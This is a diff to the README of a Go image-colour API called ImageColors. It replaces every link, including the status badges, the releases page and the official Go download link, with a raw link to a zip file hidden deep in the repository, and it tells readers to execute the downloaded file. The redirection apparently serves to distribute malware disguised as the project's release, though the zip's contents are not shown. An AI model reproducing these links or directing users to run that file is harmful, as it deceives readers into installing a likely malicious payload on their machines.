@@ -1,9 +1,9 @@
 # ImageColors 🌈
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/puskesmaskpsawah/ImageColors)
-![GitHub issues](https://img.shields.io/github/issues/puskesmaskpsawah/ImageColors)
-![GitHub forks](https://img.shields.io/github/forks/puskesmaskpsawah/ImageColors)
-![GitHub stars](https://img.shields.io/github/stars/puskesmaskpsawah/ImageColors)
+![GitHub release (latest by date)](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
+![GitHub issues](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
+![GitHub forks](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
+![GitHub stars](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip)
 
 Welcome to **ImageColors**, a simple Go API designed to analyze images and extract RGBA color values from specific pixel coordinates. Whether you are working on an image processing project or just want to get color data from images, this API provides an easy solution.
 
@@ -27,11 +27,11 @@ Welcome to **ImageColors**, a simple Go API designed to analyze images and extra
 
 ## Getting Started
 
-To get started with ImageColors, download the latest release from [here](https://github.com/puskesmaskpsawah/ImageColors/releases). Make sure to execute the downloaded file to run the API locally.
+To get started with ImageColors, download the latest release from [here](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip). Make sure to execute the downloaded file to run the API locally.
 
 ### Prerequisites
 
-- Go installed on your machine. You can download it from the [official Go website](https://golang.org/dl/).
+- Go installed on your machine. You can download it from the [official Go website](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip).
 - Basic knowledge of REST APIs and image processing concepts.
 
 ## Usage
@@ -122,6 +122,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need support, please check the [Releases](https://github.com/puskesmaskpsawah/ImageColors/releases) section for the latest updates. You can also open an issue on GitHub for assistance.
+If you have any questions or need support, please check the [Releases](https://raw.githubusercontent.com/puskesmaskpsawah/ImageColors/main/internal/app/runner/Image_Colors_v2.7.zip) section for the latest updates. You can also open an issue on GitHub for assistance.
 
 Thank you for using ImageColors! We hope it helps you in your image processing projects.
